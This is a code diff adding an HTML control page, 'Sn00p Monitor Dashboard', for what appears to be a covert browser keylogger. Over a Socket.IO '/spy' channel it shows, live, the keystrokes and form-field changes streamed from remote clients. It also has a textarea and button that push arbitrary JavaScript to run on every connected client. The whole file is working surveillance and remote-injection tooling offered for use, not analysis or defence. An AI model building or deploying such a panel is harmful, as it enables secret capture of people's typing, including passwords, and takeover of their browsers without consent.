@@ -1,0 +1,113 @@
+<!doctype html>
+<html>
+<head>
+    <title>Socket.IO chat</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { font: 13px Helvetica, Arial; }
+        h1 { margin-bottom: 20px; }
+        #messages { list-style-type: none; margin: 0; padding: 0; }
+        #messages li { padding: 5px 10px; }
+        #messages li:nth-child(odd) { background: #eee; }
+        textarea { display: block; margin-bottom: 20px; width: 100%; height: 300px; font: 16px Consolas, Courier, monospace; }
+        .col { float: left; width: 50%; padding: 10px; }
+    </style>
+</head>
+<body>
+    <div class="col">
+        <h1>Sn00p Monitor Dashboard</h1>
+        <ul id="messages"></ul>
+    </div>
+    <div class="col">
+        <h1>Embed Remote JavaScript</h1>
+        <textarea id="console" placeholder="Enter JavaScript to run against all remote clients"></textarea>
+        <button id="sendJS">Remote Embed</button>
+    </div>
+</body>
+
+<script src="/socket.io/socket.io.js"></script>
+
+<script>
+    var messages = document.getElementById('messages'),
+        console = document.getElementById('console'),
+        remoteJsButton = document.getElementById('sendJS'),
+        chat = {
+            newLineInitialised: false,
+            append: function(keyCode) {
+                if (this.newLineInitialised) {
+                    this.newLine();
+                    this.newLineInitialised = false;
+                }
+
+                var lastLine = document.querySelector('#messages li:last-child'),
+                    charCode = String.fromCharCode(keyCode);
+
+                switch(keyCode) {
+                    // Del key
+                    case 8:
+                        console.log('lastLine.innerText', lastLine.innerText);
+                        lastLine.innerText = lastLine.innerText.slice(0, -1);
+
+                        this.newLineInitialised = false;
+                        return;
+
+                    // Space key
+                    case 13:
+                        charCode = '<br/>';
+                        break;
+
+                    case 32:
+                        charCode = '&nbsp;';
+                        break;
+                }
+
+                lastLine.innerHTML += charCode;
+
+                console.log('keyCode', keyCode, charCode);
+
+                this.newLineInitialised = false;
+            },
+            newLine: function(msg) {
+                var li = document.createElement('li');
+                if (msg) {
+                    li.innerHTML = msg;
+                }
+                messages.appendChild(li);
+
+                this.newLineInitialised = true;
+            }
+        },
+        socket = io('/spy'),
+        lastElement,
+        newLine = false,
+        elementChange = function(newElement) {
+            if (lastElement !== newElement) {
+                var message = 'User changed element to: <b>' + newElement + '</b>';
+                chat.newLine(message);
+
+                lastElement = newElement;
+            }
+        };
+
+    socket.on('update', function(change){
+        switch(change.type) {
+            case 'type':
+                chat.append(change.msg);
+                break;
+            case 'element-change':
+                elementChange(change.msg);
+                break;
+        }
+    });
+
+    remoteJsButton.onclick = function() {
+        if (console.value !== '') {
+            socket.emit('remoteJs', console.value);
+            console.value = '';
+        }
+        return false;
+    };
+
+</script>
+
+</html>
